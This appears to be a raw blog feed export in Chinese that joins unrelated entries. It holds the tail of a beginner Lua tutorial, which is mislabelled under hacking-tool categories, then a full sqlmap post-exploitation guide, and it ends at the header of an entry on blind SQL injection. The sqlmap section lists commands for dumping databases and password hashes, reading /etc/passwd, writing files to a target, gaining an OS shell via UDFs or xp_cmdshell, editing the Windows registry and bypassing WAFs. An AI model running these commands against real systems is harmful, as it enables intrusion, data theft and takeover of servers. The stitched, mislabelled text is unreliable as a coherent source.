<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608103859650.png" alt="在这里插入图片描述"><br>实咧<br>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;lua</span><br><span class="line">a&#x3D;&quot;abc&quot;</span><br><span class="line">if (a&#x3D;&#x3D;&quot;abc&quot;)</span><br><span class="line">then</span><br><span class="line">   print(&quot;a变量是abc&quot;)</span><br><span class="line">end</span><br><span class="line">   print(&quot;##########&quot;)</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608104550349.png" alt="在这里插入图片描述"></p>
<h2 id="1-2-if-…else"><a href="#1-2-if-…else" class="headerlink" title="1.2 if …else"></a>1.2 if …else</h2><p>咧<br>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;lua</span><br><span class="line">a&#x3D;&quot;qwe&quot;</span><br><span class="line">if (a&#x3D;&#x3D;&quot;abc&quot;)</span><br><span class="line">then</span><br><span class="line">print(&quot;a变量是abc&quot;)</span><br><span class="line">elseif(a&#x3D;&#x3D;&quot;qwe&quot;)</span><br><span class="line">then</span><br><span class="line">print(&quot;a变量啥qwe&quot;)</span><br><span class="line">end </span><br><span class="line">print(&quot;##########&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608105633650.png" alt="在这里插入图片描述"></p>
<h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><p>为真就循环do里面的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while(真)</span><br><span class="line">do</span><br><span class="line">print(&quot;a&quot;)</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>咧<br>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;lua</span><br><span class="line">a&#x3D;1</span><br><span class="line">while(a&lt;10)</span><br><span class="line">do</span><br><span class="line">print(a)</span><br><span class="line">a&#x3D;a+1</span><br><span class="line">end</span><br><span class="line">print(&quot;结束&quot;)</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608110705730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<h2 id="for循环语句"><a href="#for循环语句" class="headerlink" title="for循环语句"></a>for循环语句</h2><p>与while不同的是，for语句可以直接控制循环重复执行的次数<br>咧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;lua</span><br><span class="line">for a&#x3D;1,10</span><br><span class="line">do </span><br><span class="line">print(a)</span><br><span class="line">end </span><br><span class="line">print(&quot;结束&quot;)</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608111523863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<h2 id="repeat循环"><a href="#repeat循环" class="headerlink" title="repeat循环"></a>repeat循环</h2><p>repeat…until结构也是Lua的一种循环结构，这个结构不断地重复执行循环，直到指定的条件为真时为止<br>如果一直为假就一直执行print(“a”)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">repeat</span><br><span class="line">print(&quot;a&quot;)</span><br><span class="line">until(假)</span><br></pre></td></tr></table></figure>
<p>咧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;lua</span><br><span class="line">a&#x3D;1</span><br><span class="line">repeat</span><br><span class="line">print(a)</span><br><span class="line">a&#x3D;a+1</span><br><span class="line">until(a&gt;10)</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/202006081124425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="break循环语句"><a href="#break循环语句" class="headerlink" title="break循环语句"></a>break循环语句</h2><p>break语句是一种循环控制语句，可以实现退出当前循环或语句</p>
<h2 id="Lua数据类型"><a href="#Lua数据类型" class="headerlink" title="Lua数据类型"></a>Lua数据类型</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608113003706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>咧<br>函数type是用来查看类型的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;lua</span><br><span class="line">a&#x3D;1</span><br><span class="line">print(type(a))</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608113444663.png" alt="在这里插入图片描述"></p>
<h2 id="string库"><a href="#string库" class="headerlink" title="string库"></a>string库</h2><ol>
<li><p>全部转为大写字母<br>string.upper()<br>upper函数将字符串中的字符全部转为大写字母<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608113843110.png" alt="在这里插入图片描述"></p>
</li>
<li><p>全部转为小写字母</p>
<p> string.lower()<br> lower函数将字符串中的字符全部转为小写字母<br> <img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608114117988.png" alt="在这里插入图片描述"></p>
</li>
<li><p>替换</p>
</li>
</ol>
<p>咧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.gsub(&quot;adadadadadad&quot;,&quot;a&quot;,&quot;4&quot;,2)</span><br></pre></td></tr></table></figure>
<p>adadadadadad里面的a替换2个替换成4<br>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608115307678.png" alt="在这里插入图片描述"></p>
<ol start="4">
<li>查询字符在的位置<br>函数find()<br>咧<br>代码</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(string.find(&quot;abcdefg&quot;,&quot;f&quot;,2))</span><br></pre></td></tr></table></figure>
<p>上面的意思就是在abcdefg字符里面的第2的位置查看是否有f这个字符<br>如果没有找到就返回nil<br>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608193639731.png" alt="在这里插入图片描述"><br>5. 数字转换成字符<br>string.char(xxx,xxx,xxx,xxx)<br>char函数将整型数字转成字符并连接，<br>就是对应的ASCII码值<br>咧<br>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(string.char(65,66,67,68))</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608194406939.png" alt="在这里插入图片描述"><br>6. 字符转换成数字<br>string.byte(xx,xx,xx)<br>byte函数转换字符为整数值<br>他好像只能转换一个字符<br>可以指定字符<br>1.咧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(string.byte(&quot;B&quot;))</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608194901292.png" alt="在这里插入图片描述"><br>7. 计算字符串的长度<br>string.len()<br>len函数计算字符串长度<br>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;&quot;ABCD&quot;</span><br><span class="line">print(string.len(a))</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608195617278.png" alt="在这里插入图片描述"><br>8. 重复显示字符串和连接<br>string.rep()<br><strong>1.rep函数返回字符串string的n个拷贝</strong><br>咧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(string.rep(&quot;ACBD:&quot;,3))</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200608200257254.png" alt="在这里插入图片描述"><br>上面的意思就是重复3次</p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>nmap</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>5. sqlmap工具详细使用任务097：SQLMAP自动注入找到漏洞后阶段</title>
    <url>/2019/11/30/5.%20sqlmap%E5%B7%A5%E5%85%B7%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8%E4%BB%BB%E5%8A%A1097%EF%BC%9ASQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%E6%89%BE%E5%88%B0%E6%BC%8F%E6%B4%9E%E5%90%8E%E9%98%B6%E6%AE%B5/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="指纹参数"><a href="#指纹参数" class="headerlink" title="指纹参数"></a>指纹参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ngerprint:</span><br><span class="line">    -f, --fingerprint   Perform an extensive DBMS version fingerprint</span><br><span class="line"></span><br><span class="line">  Enumeration:</span><br><span class="line">    These options can be used to enumerate the back-end database</span><br><span class="line">    management system information, structure and data contained in the</span><br><span class="line">    tables. Moreover you can run your own SQL statements</span><br><span class="line"></span><br><span class="line">    -a, --all           Retrieve everything</span><br><span class="line">    -b, --banner        Retrieve DBMS banner</span><br><span class="line">    --current-user      Retrieve DBMS current user</span><br><span class="line">    --current-db        Retrieve DBMS current database</span><br><span class="line">    --hostname          Retrieve DBMS server hostname</span><br><span class="line">    --is-dba            Detect if the DBMS current user is DBA</span><br><span class="line">    --users             Enumerate DBMS users</span><br><span class="line">    --passwords         Enumerate DBMS users password hashes</span><br><span class="line">    --privileges        Enumerate DBMS users privileges</span><br><span class="line">    --roles             Enumerate DBMS users roles</span><br><span class="line">    --dbs               Enumerate DBMS databases</span><br><span class="line">    --tables            Enumerate DBMS database tables</span><br><span class="line">    --columns           Enumerate DBMS database table columns</span><br><span class="line">    --schema            Enumerate DBMS schema</span><br><span class="line">    --count             Retrieve number of entries for table(s)</span><br><span class="line">    --dump              Dump DBMS database table entries</span><br><span class="line">    --dump-all          Dump all DBMS databases tables entries</span><br><span class="line">    --search            Search column(s), table(s) and&#x2F;or database name(s)</span><br><span class="line">    --comments          Check for DBMS comments during enumeration</span><br><span class="line">    --statements        Retrieve SQL statements being run on DBMS</span><br><span class="line">    -D DB               DBMS database to enumerate</span><br><span class="line">    -T TBL              DBMS database table(s) to enumerate</span><br><span class="line">    -C COL              DBMS database table column(s) to enumerate</span><br><span class="line">    -X EXCLUDE          DBMS database identifier(s) to not enumerate</span><br><span class="line">    -U USER             DBMS user to enumerate</span><br><span class="line">    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables</span><br><span class="line">    --pivot-column&#x3D;P..  Pivot column name</span><br><span class="line">    --where&#x3D;DUMPWHERE   Use WHERE condition while table dumping</span><br><span class="line">    --start&#x3D;LIMITSTART  First dump table entry to retrieve</span><br><span class="line">    --stop&#x3D;LIMITSTOP    Last dump table entry to retrieve</span><br><span class="line">    --first&#x3D;FIRSTCHAR   First query output word character to retrieve</span><br><span class="line">    --last&#x3D;LASTCHAR     Last query output word character to retrieve</span><br><span class="line">    --sql-query&#x3D;SQLQ..  SQL statement to be executed</span><br><span class="line">    --sql-shell         Prompt for an interactive SQL shell</span><br><span class="line">    --sql-file&#x3D;SQLFILE  Execute SQL statements from given file(s)</span><br></pre></td></tr></table></figure>
<h3 id="查找当前数据库的帐号参数-current-user"><a href="#查找当前数据库的帐号参数-current-user" class="headerlink" title="查找当前数据库的帐号参数  --current-user"></a>查找当前数据库的帐号参数  <code>--current-user</code></h3><h3 id="参看当前数据库的名称参数-current-db"><a href="#参看当前数据库的名称参数-current-db" class="headerlink" title="参看当前数据库的名称参数--current-db"></a>参看当前数据库的名称参数<code>--current-db</code></h3><h3 id="参看目标主机名参数-hostname"><a href="#参看目标主机名参数-hostname" class="headerlink" title="参看目标主机名参数--hostname"></a>参看目标主机名参数<code>--hostname</code></h3><h3 id="参看所有的用户帐号参数-users"><a href="#参看所有的用户帐号参数-users" class="headerlink" title="参看所有的用户帐号参数--users"></a>参看所有的用户帐号参数<code>--users</code></h3><h3 id="参看用户参数-privileges-参看当前用户后面可以加上-u-指定用户可以加上用户名"><a href="#参看用户参数-privileges-参看当前用户后面可以加上-u-指定用户可以加上用户名" class="headerlink" title="参看用户参数--privileges 参看当前用户后面可以加上-u 指定用户可以加上用户名"></a>参看用户参数<code>--privileges</code> 参看当前用户后面可以加上<code>-u</code> 指定用户可以加上用户名</h3><h3 id="参看绝色-roles"><a href="#参看绝色-roles" class="headerlink" title="参看绝色--roles"></a>参看绝色<code>--roles</code></h3><h3 id="参看数据库的所有库-dbs"><a href="#参看数据库的所有库-dbs" class="headerlink" title="参看数据库的所有库--dbs"></a>参看数据库的所有库<code>--dbs</code></h3><h3 id="全部使用默认的不需要输入回车和选择y和n了参数-batch"><a href="#全部使用默认的不需要输入回车和选择y和n了参数-batch" class="headerlink" title="全部使用默认的不需要输入回车和选择y和n了参数--batch"></a>全部使用默认的不需要输入回车和选择y和n了参数<code>--batch</code></h3><h3 id="数据库内容参看-不如用-dbs查看到库了然后在参看库里面的内容"><a href="#数据库内容参看-不如用-dbs查看到库了然后在参看库里面的内容" class="headerlink" title="数据库内容参看 不如用--dbs查看到库了然后在参看库里面的内容"></a><strong>数据库内容参看 不如用<code>--dbs</code>查看到库了然后在参看库里面的内容</strong></h3><h4 id="查看库里面的表"><a href="#查看库里面的表" class="headerlink" title="查看库里面的表"></a>查看库里面的表</h4><pre><code>指定库参数`-D`
查看库里面的表参数`--tables`
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-D 要指定的库名  --tables</span><br></pre></td></tr></table></figure></code></pre>
<h4 id="查看表里面的表"><a href="#查看表里面的表" class="headerlink" title="查看表里面的表"></a>查看表里面的表</h4><pre><code>指定表参数`-T`
查看表参数 `--columns`



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-D 要指定的库名 -T 要指定的表名  --columns</span><br></pre></td></tr></table></figure></code></pre>
<h4 id="参看列里面的数据"><a href="#参看列里面的数据" class="headerlink" title="参看列里面的数据"></a>参看列里面的数据</h4><p>指定列<code>-C</code><br>查看内容参数<code>--dump</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-D 要指定的库名 -T 要指定的表名 -C 要指定的列名 --dump</span><br></pre></td></tr></table></figure>
<p>还可以指定第几个列里面的第几个参数 <code>--start</code> 和  <code>--stop</code><br>–start 要参看从那  –stop 要参看到那<br>列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--start 4  --stop 6  				要参看的是从4到6</span><br></pre></td></tr></table></figure>

<h3 id="指定sql语句"><a href="#指定sql语句" class="headerlink" title="指定sql语句"></a>指定sql语句</h3><pre><code>    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--sql-query “要指定的sql语句” </span><br></pre></td></tr></table></figure></code></pre>
<h2 id="蛮力参数"><a href="#蛮力参数" class="headerlink" title="蛮力参数"></a>蛮力参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rute force:</span><br><span class="line">    These options can be used to run brute force checks</span><br><span class="line"></span><br><span class="line">    --common-tables     Check existence of common tables</span><br><span class="line">    --common-columns    Check existence of common columns</span><br></pre></td></tr></table></figure>
<h3 id="暴力破解库，表，列"><a href="#暴力破解库，表，列" class="headerlink" title="暴力破解库，表，列"></a>暴力破解库，表，列</h3><p>低于5.0版本的mysql是没有information_schema 库的<br> 或者5.0以上的information_schema 无权读取<br> 还有微微的access的数据库，默认密码在MSysObjects 库里但是也无权读取<br> 那就只能暴力破解了</p>
<h3 id="破解表"><a href="#破解表" class="headerlink" title="破解表"></a>破解表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--common-tables</span><br></pre></td></tr></table></figure>
<p>调用这个参数后在后面要指定并发数这个并发是字段的意思</p>
<h3 id="破解列"><a href="#破解列" class="headerlink" title="破解列"></a>破解列</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--common-columns</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191127001207908.png" alt="在这里插入图片描述"><br>调用这个参数后在后面要指定并发数这个并发是字段的意思</p>
<h2 id="用户定义的功能注入参数"><a href="#用户定义的功能注入参数" class="headerlink" title="用户定义的功能注入参数"></a>用户定义的功能注入参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-defined function injection:</span><br><span class="line">    These options can be used to create custom user-defined functions</span><br><span class="line"></span><br><span class="line">    --udf-inject        Inject custom user-defined functions</span><br><span class="line">    --shared-lib&#x3D;SHLIB  Local path of the shared library</span><br></pre></td></tr></table></figure>
<h3 id="编写自己的函数"><a href="#编写自己的函数" class="headerlink" title="编写自己的函数"></a>编写自己的函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--udf-inject , --shared-lib </span><br></pre></td></tr></table></figure>
<p>Windows ғDLL<br>Linux ғ shared object<br>可以访问这个地址参看详细内容<a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system%02full-control-whitepaper-4633857">http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857</a></p>
<h2 id="文件系统访问参数"><a href="#文件系统访问参数" class="headerlink" title="文件系统访问参数"></a>文件系统访问参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">File system access:</span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system underlying file system</span><br><span class="line"></span><br><span class="line">    --file-read&#x3D;RFILE   							Read a file from the back-end DBMS file system</span><br><span class="line">    --file-write&#x3D;WFILE  							Write a local file on the back-end DBMS file system</span><br><span class="line">    --file-dest&#x3D;DFILE   							Back-end DBMS absolute filepath to write to</span><br></pre></td></tr></table></figure>
<h3 id="进行目标服务器系统读，写操作"><a href="#进行目标服务器系统读，写操作" class="headerlink" title="进行目标服务器系统读，写操作"></a>进行目标服务器系统<strong>读，写</strong>操作</h3><h4 id="读参数"><a href="#读参数" class="headerlink" title="读参数"></a>读参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--file-read&#x3D;&quot;&#x2F;etc&#x2F;passwd&quot;		读取的是&#x2F;etc&#x2F;passwd的文件</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191127001926975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191127001936641.png" alt="在这里插入图片描述">12.rating system access:<br>These options can be used to access the back-end database management<br>system underlying operating system</p>
<p>–os-cmd=OSCMD      Execute an operating system command<br>–os-shell          Prompt for an interactive operating system shell<br>–os-pwn            Prompt for an OOB shell, Meterpreter or VNC<br>–os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC<br>–os-bof            Stored procedure buffer overflow exploitation<br>–priv-esc          Database process user privilege escalation<br>–msf-path=MSFPATH  Local path where Metasploit Framework is installed<br>–tmp-path=TMPPATH  Remote absolute path of temporary files directory</p>
<h4 id="写"><a href="#写" class="headerlink" title="写"></a>写</h4><p>先要创建一个文件，在发进目标目标系统里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--file-write&#x3D;&quot;要保存到服务器的本地文件&quot; --file-dest &quot;目标网站的保存的地址&quot;</span><br></pre></td></tr></table></figure>
<h2 id="评分系统访问参数"><a href="#评分系统访问参数" class="headerlink" title="评分系统访问参数"></a>评分系统访问参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rating system access:</span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system underlying operating system</span><br><span class="line"></span><br><span class="line">    --os-cmd&#x3D;OSCMD      Execute an operating system command</span><br><span class="line">    --os-shell          Prompt for an interactive operating system shell</span><br><span class="line">    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC</span><br><span class="line">    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC</span><br><span class="line">    --os-bof            Stored procedure buffer overflow exploitation</span><br><span class="line">    --priv-esc          Database process user privilege escalation</span><br><span class="line">    --msf-path&#x3D;MSFPATH  Local path where Metasploit Framework is installed</span><br><span class="line">    --tmp-path&#x3D;TMPPATH  Remote absolute path of temporary files directory</span><br></pre></td></tr></table></figure>
<h3 id="运行操作系统命令"><a href="#运行操作系统命令" class="headerlink" title="运行操作系统命令"></a>运行操作系统命令</h3><p><strong>版本mysql原理：上传共享库并生成sys_exec()、sys_eval()两个UDF</strong></p>
<p>会给目标服务器在自己库里会生成sys_exec()、sys_eval()两个UDF给目标</p>
<p><strong>版本Mssql原理：xp_cmdshell 存储过程(有就用、禁了启，没有建)</strong><br>目标可能会删除 存储过程那么sqlmao就启动，禁用 存储过程sqlmap就给他启动，没有这 存储过程就sqlmap就给他创建一个</p>
<ol>
<li><code>--os-cmd=要运行的命令像ls</code></li>
<li><code>--os-shell</code> </li>
<li><code>--sql-shell</code> </li>
</ol>
<h2 id="Windows注册表访问参数"><a href="#Windows注册表访问参数" class="headerlink" title="Windows注册表访问参数"></a>Windows注册表访问参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows registry access:</span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system Windows registry</span><br><span class="line"></span><br><span class="line">    --reg-read          Read a Windows registry key value</span><br><span class="line">    --reg-add           Write a Windows registry key value data</span><br><span class="line">    --reg-del           Delete a Windows registry key value</span><br><span class="line">    --reg-key&#x3D;REGKEY    Windows registry key</span><br><span class="line">    --reg-value&#x3D;REGVAL  Windows registry key value</span><br><span class="line">    --reg-data&#x3D;REGDATA  Windows registry key value data</span><br><span class="line">    --reg-type&#x3D;REGTYPE  Windows registry key value type</span><br></pre></td></tr></table></figure>
<p>windows注册表操作</p>
<ol>
<li>读取注册表参数<code>--reg-read</code>  </li>
<li>添加注册表参数<code>--reg-add</code> </li>
<li>删除注册表参数<code>--reg-del</code> </li>
<li>指定注册表的键<code>--reg-key</code> </li>
<li>指定注册表的值<code>--reg-value</code> </li>
<li>指定注册表的数据<code>--reg-data</code> </li>
<li>指定注册表的类型<code>--reg-type</code></li>
</ol>
<p>列<br><code>sqlmap –u=&quot;http://1.1.1.1/a.aspx?id=1&quot; --reg-add --regkey=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test -- reg-type=REG_SZ --reg-data=1</code></p>
<h2 id="一般参数"><a href="#一般参数" class="headerlink" title="一般参数"></a>一般参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">General:</span><br><span class="line">    These options can be used to set some general working parameters</span><br><span class="line"></span><br><span class="line">    -s SESSIONFILE      Load session from a stored (.sqlite) file</span><br><span class="line">    -t TRAFFICFILE      Log all HTTP traffic into a textual file</span><br><span class="line">    --batch             Never ask for user input, use the default behavior</span><br><span class="line">    --binary-fields&#x3D;..  Result fields having binary values (e.g. &quot;digest&quot;)</span><br><span class="line">    --check-internet    Check Internet connection before assessing the target</span><br><span class="line">    --crawl&#x3D;CRAWLDEPTH  Crawl the website starting from the target URL</span><br><span class="line">    --crawl-exclude&#x3D;..  Regexp to exclude pages from crawling (e.g. &quot;logout&quot;)</span><br><span class="line">    --csv-del&#x3D;CSVDEL    Delimiting character used in CSV output (default &quot;,&quot;)</span><br><span class="line">    --charset&#x3D;CHARSET   Blind SQL injection charset (e.g. &quot;0123456789abcdef&quot;)</span><br><span class="line">    --dump-format&#x3D;DU..  Format of dumped data (CSV (default), HTML or SQLITE)</span><br><span class="line">    --encoding&#x3D;ENCOD..  Character encoding used for data retrieval (e.g. GBK)</span><br><span class="line">    --eta               Display for each output the estimated time of arrival</span><br><span class="line">    --flush-session     Flush session files for current target</span><br><span class="line">    --forms             Parse and test forms on target URL</span><br><span class="line">    --fresh-queries     Ignore query results stored in session file</span><br><span class="line">    --har&#x3D;HARFILE       Log all HTTP traffic into a HAR file</span><br><span class="line">    --hex               Use DBMS hex function(s) for data retrieval</span><br><span class="line">    --output-dir&#x3D;OUT..  Custom output directory path</span><br><span class="line">    --parse-errors      Parse and display DBMS error messages from responses</span><br><span class="line">    --save&#x3D;SAVECONFIG   Save options to a configuration INI file</span><br><span class="line">    --scope&#x3D;SCOPE       Regexp to filter targets from provided proxy log</span><br><span class="line">    --test-filter&#x3D;TE..  Select tests by payloads and&#x2F;or titles (e.g. ROW)</span><br><span class="line">    --test-skip&#x3D;TEST..  Skip tests by payloads and&#x2F;or titles (e.g. BENCHMARK)</span><br><span class="line">    --update            Update sqlmap</span><br></pre></td></tr></table></figure>
<ol>
<li><p>设置扫描会话文是件保存位置列：<code>-s &quot;要保存的文件和文件地址&quot;</code></p>
</li>
<li><p>指定记录流量文件保存位置列：<code>-t &quot;要保存的文件和文件地址&quot;</code></p>
</li>
<li><p>强制进行编码列：<code>–charset=&quot;要编码的&quot;</code></p>
</li>
<li><p>在当前URL爬网爬多深–crawl: 从起始位置爬站深度列： <code>--batch -crawl=3</code></p>
</li>
<li><p>–csv-del: 指定其他分隔符, dump数据默认存于“,”分割的CSV文件中 例：<code>--csv-del=&quot;;&quot;</code></p>
</li>
<li><p>清空会话记录 <code>--flush-session</code></p>
</li>
<li><p>扫描完成后sqlmap会用扫描记录可以用<code>–fresh-queries</code> 忽略扫描记录</p>
</li>
<li><p>进行https扫描 <code>--force-ssl</code></p>
</li>
<li><p>. –hex: dump非ASCI字符内容时，将其编码为16进制形式，收到后解码还原 </p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;s.php?id&#x3D;1&quot; --hex -v 3 </span><br></pre></td></tr></table></figure></li>
<li><p>指定另外目标目录列：<code>--output-dir=/tmp</code>‘</p>
</li>
<li><p>分析和现实数据库内建报错信息 列：<code>--parse-errors</code></p>
</li>
<li><p>将命令保存成配置文件 列：<code>--save   /root/a.txt</code></p>
</li>
</ol>
<h2 id="杂参数"><a href="#杂参数" class="headerlink" title="杂参数"></a>杂参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Miscellaneous:</span><br><span class="line">    -z MNEMONICS        Use short mnemonics (e.g. &quot;flu,bat,ban,tec&#x3D;EU&quot;)</span><br><span class="line">    --alert&#x3D;ALERT       Run host OS command(s) when SQL injection is found</span><br><span class="line">    --answers&#x3D;ANSWERS   Set question answers (e.g. &quot;quit&#x3D;N,follow&#x3D;N&quot;)</span><br><span class="line">    --beep              Beep on question and&#x2F;or when SQL injection is found</span><br><span class="line">    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables</span><br><span class="line">    --dependencies      Check for missing (non-core) sqlmap dependencies</span><br><span class="line">    --disable-coloring  Disable console output coloring</span><br><span class="line">    --gpage&#x3D;GOOGLEPAGE  Use Google dork results from specified page number</span><br><span class="line">    --identify-waf      Make a thorough testing for a WAF&#x2F;IPS&#x2F;IDS protection</span><br><span class="line">    --mobile            Imitate smartphone through HTTP User-Agent header</span><br><span class="line">    --offline           Work in offline mode (only use session data)</span><br><span class="line">    --purge-output      Safely remove all content from output directory</span><br><span class="line">    --skip-waf          Skip heuristic detection of WAF&#x2F;IPS&#x2F;IDS protection</span><br><span class="line">    --smart             Conduct thorough tests only if positive heuristic(s)</span><br><span class="line">    --sqlmap-shell      Prompt for an interactive sqlmap shell</span><br><span class="line">    --tmp-dir&#x3D;TMPDIR    Local directory for storing temporary files</span><br><span class="line">    --web-root&#x3D;WEBROOT  Web server document root directory (e.g. &quot;&#x2F;var&#x2F;www&quot;)</span><br><span class="line">    --wizard            Simple wizard interface for beginner users</span><br></pre></td></tr></table></figure>
<ol>
<li>参数助记符-Z</li>
<li>检测waf/ip/ids 列：<code>--check-waf</code></li>
<li>绕过WAF/IPS/IDS的有效方法，尤其对 ASP/IIS 和 ASP.NET/IIS 比较有效的 列：<code>--hpp</code></li>
<li>检测waf/ip/ids等等等等的30多种产品列：<code>--identify-waf</code></li>
<li>通过修改头模拟手机浏览器访问请求列：<code>--mobile</code></li>
<li>清空所以扫描记录也就是清空清除output文件夹 <code>--purge-outputғ</code></li>
<li>偷工减料扫描-<code>-smart</code></li>
<li>向导方式扫描<code>--wizard</code></li>
</ol>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>5. 网易web安全渗透， sql时间盲注</title>
    <url>/2020/08/10/5.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%EF%BC%8C%20sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
